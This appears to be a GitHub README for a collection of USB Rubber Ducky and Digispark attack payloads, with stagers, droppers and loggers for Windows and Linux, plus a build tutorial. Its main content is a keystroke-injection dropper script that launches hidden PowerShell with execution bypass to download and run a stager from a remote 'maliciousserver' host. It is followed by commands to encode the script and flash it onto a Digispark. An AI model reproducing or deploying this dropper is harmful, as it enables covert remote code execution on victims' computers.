# Miscellaneous payload for rubberducky

### Here, you can found :

- Release of tools (duck2spark & USB-Rubber-Ducky)
- sample of script stager
- sample of payload dropper (rubber ducky)
- Other things (logger, etc ...)

Of course, for linux and windows !


### This repo include this 2 github project (keeped because they disappeared)

https://github.com/hak5darren/USB-Rubber-Ducky
https://github.com/mame82/duck2spark




## How work ? (tutorial in https://k-lfa.info/digispark-hacking/)

1. Make your rubberduck payload (in dropper context)

```
GUI r
DELAY 300
STRING powershell.exe -exec bypass -w hidden -nop -c "iex(New-Object System.Net.WebClient).DownloadString('https://maliciousserver/stager.ps1')"
DELAY 800
ENTER
DELAY 700
GUI r
DELAY 200
STRING notepad
DELAY 300
ENTER
DELAY 100
STRING H4cked !
DELAY 200
GUI l
```

2. Encode your payload (with duckencoder) (Don't forget the keyboard context ! qwerty or azerty)

```
java -jar duckencoder.jar -i duckpayload.txt -o ducky.bin -l fr
```

3. Translate your payload in C++ code

```
python duck2spark/duck2spark.py -i ducky.bin -l 1 -o Payload.bin
```

4. Copy / Paste your C++ code in Arduino IDE and Upload this in digispark !

Enjoy
